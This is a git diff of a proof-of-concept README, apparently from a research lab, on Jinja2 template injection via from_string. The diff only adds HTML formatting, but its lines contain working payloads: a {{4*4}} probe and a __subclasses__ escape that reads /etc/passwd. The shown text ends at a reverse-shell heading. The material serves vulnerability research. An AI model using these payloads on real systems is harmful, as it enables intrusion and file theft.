@@ -1,5 +1,5 @@
 <a href="https://ordina.nl" target="_blank"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBTgtBKmWL2i-76KccY9u0mrxAF9i0bPAJasA2YYeapgsL02AGlg" 
-alt="Ordina  Research Lab" width="240" height="180" border="10" /></a>
+alt="Ordina  Research Lab" width="240" text-align="center" height="180" border="10" /></a>
 
 #Jinja2 Command injection from_string function <br />
 #Website: Ordina.nl <br />
@@ -30,14 +30,14 @@ if __name__ == "__main__":
 ```
 
 
-POC
+<b>POC</b>
 //Exploiting the username param
-http://localhost:4444/?username={{4*4}}
+http://localhost:4444/?username={{4*4}} <br />
 OUTPUT: Hello 16
 
-Reading the /etc/passwd
+Reading the /etc/passwd <br />
 
-http://localhost:4444/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+http://localhost:4444/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} <br />
 
 
 Getting a reverse shell 
